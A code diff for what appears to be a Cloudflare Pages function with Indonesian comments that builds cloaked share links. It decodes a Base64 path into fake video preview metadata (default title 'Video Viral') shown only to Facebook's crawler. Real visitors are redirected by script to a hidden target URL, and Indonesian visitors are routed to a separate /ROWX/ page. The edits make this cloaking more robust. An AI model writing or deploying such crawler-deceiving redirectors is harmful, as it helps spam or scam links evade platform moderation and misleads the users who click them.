@@ -2,14 +2,20 @@ export async function onRequest(context) {
   const url = new URL(context.request.url);
   const pathParts = url.pathname.split('/').filter(p => p);
 
-  // Jika klik domain utama tanpa data, lempar ke Google
+  // Jika tidak ada data atau akses folder ROWX secara manual, biarkan Cloudflare handle file statis
   if (pathParts.length < 1 || pathParts[0] === 'ROWX') {
-    return null; 
+    return context.next(); 
   }
 
   try {
-    // 1. Dekode data Base64 dari URL
-    const decodedData = atob(pathParts[0]);
+    // Ambil string Base64 dari URL
+    let base64Data = pathParts[0];
+    
+    // Fix: Mengembalikan karakter yang mungkin hilang saat proses copy-paste
+    base64Data = base64Data.replace(/-/g, '+').replace(/_/g, '/');
+    
+    // Dekode Base64 secara aman (UTF-8 support)
+    const decodedData = decodeURIComponent(escape(atob(base64Data)));
     const parts = decodedData.split('|||'); 
 
     const title  = parts[0] || "Video Viral";
@@ -18,16 +24,15 @@ export async function onRequest(context) {
     const image  = parts[3] || "";
     const target = parts[4] || "https://google.com";
 
-    // 2. Logika Redirect Negara (Indonesia ke /ROWX/)
+    // Logika Redirect Negara (Indonesia ke /ROWX/)
     const country = context.request.cf.country;
     let finalRedirect = target;
 
     if (country === "ID") {
-      const baseUrl = new URL(context.request.url).origin;
+      const baseUrl = url.origin;
       finalRedirect = baseUrl + "/ROWX/"; 
     }
 
-    // 3. Output HTML untuk Bot Facebook
     return new Response(`
       <!DOCTYPE html>
       <html>
@@ -44,15 +49,16 @@ export async function onRequest(context) {
         <meta property="og:video:url" content="${url.href}">
         <meta property="og:video:type" content="text/html">
         <script>
-          // Jika user (bukan bot FB), arahkan sesuai negara
           if (!navigator.userAgent.includes('facebookexternalhit')) {
             window.location.href = "${finalRedirect}";
           }
         </script>
       </head>
-      <body></body>
+      <body style="background:#000;color:#fff;">Redirecting...</body>
       </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
+
   } catch (e) {
+    // Jika Base64 rusak atau error, jangan tampilkan 1101, lempar ke Google
     return Response.redirect("https://google.com", 302);
   }
 }
